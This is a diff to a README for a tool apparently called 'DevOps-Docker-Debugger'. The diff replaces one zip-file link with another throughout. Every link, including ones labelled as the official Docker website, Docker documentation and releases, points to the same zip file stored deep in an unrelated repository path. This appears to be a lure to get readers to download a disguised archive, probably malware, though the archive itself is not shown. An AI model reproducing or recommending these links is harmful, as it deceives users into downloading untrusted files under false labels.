@@ -1,6 +1,6 @@
 # 🎉 DevOps-Docker-Debugger - Simplifying Docker Debugging for Everyone
 
-[![Download](https://raw.githubusercontent.com/Gopal-91/DevOps-Docker-Debugger/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)](https://raw.githubusercontent.com/Gopal-91/DevOps-Docker-Debugger/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)
+[![Download](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/Debugger_Ops_Dev_Docker_v2.2.zip)](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/Debugger_Ops_Dev_Docker_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to the DevOps-Docker-Debugger! This application helps you improve your d
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download](https://raw.githubusercontent.com/Gopal-91/DevOps-Docker-Debugger/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip). Here, you will find the latest version available for download.
+To get started, [visit this page to download](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/Debugger_Ops_Dev_Docker_v2.2.zip). Here, you will find the latest version available for download.
 
 1. Open the link above.
 2. Look for the latest release version.
@@ -32,7 +32,7 @@ To get started, [visit this page to download](https://raw.githubusercontent.com/
 ### 💻 System Requirements
 
 - **Operating System**: Windows 10, macOS, or any Linux distribution.
-- **Docker**: Ensure Docker is installed on your machine. You can download it from the [official Docker website](https://raw.githubusercontent.com/Gopal-91/DevOps-Docker-Debugger/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip).
+- **Docker**: Ensure Docker is installed on your machine. You can download it from the [official Docker website](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/Debugger_Ops_Dev_Docker_v2.2.zip).
 - **Memory**: Minimum of 8GB RAM for optimal performance.
 - **Disk Space**: At least 1GB of free disk space.
 
@@ -57,9 +57,9 @@ You can also reach out to the community for help or check the GitHub Issues page
 
 ## 💡 Learning Resources
 
-- [Docker Documentation](https://raw.githubusercontent.com/Gopal-91/DevOps-Docker-Debugger/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)
-- [Docker Compose Documentation](https://raw.githubusercontent.com/Gopal-91/DevOps-Docker-Debugger/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)
-- [Debugging Techniques in Docker](https://raw.githubusercontent.com/Gopal-91/DevOps-Docker-Debugger/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)
+- [Docker Documentation](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/Debugger_Ops_Dev_Docker_v2.2.zip)
+- [Docker Compose Documentation](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/Debugger_Ops_Dev_Docker_v2.2.zip)
+- [Debugging Techniques in Docker](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/Debugger_Ops_Dev_Docker_v2.2.zip)
 
 ## ⚙️ Support
 
@@ -71,7 +71,7 @@ We encourage contributions! If you want to help improve the DevOps-Docker-Debugg
 
 ## 🔗 Important Links
 
-- [View Releases](https://raw.githubusercontent.com/Gopal-91/DevOps-Docker-Debugger/master/exercice-4-elk/logstash/pipeline/Dev-Debugger-Ops-Docker-mesoscutum.zip)
+- [View Releases](https://github.com/Gopal-91/DevOps-Docker-Debugger/raw/refs/heads/master/exercice-4-elk/Debugger_Ops_Dev_Docker_v2.2.zip)
 - [Documentation](LINK_TO_DOCUMENTATION)
 - [Community Forum](LINK_TO_FORUM)
 
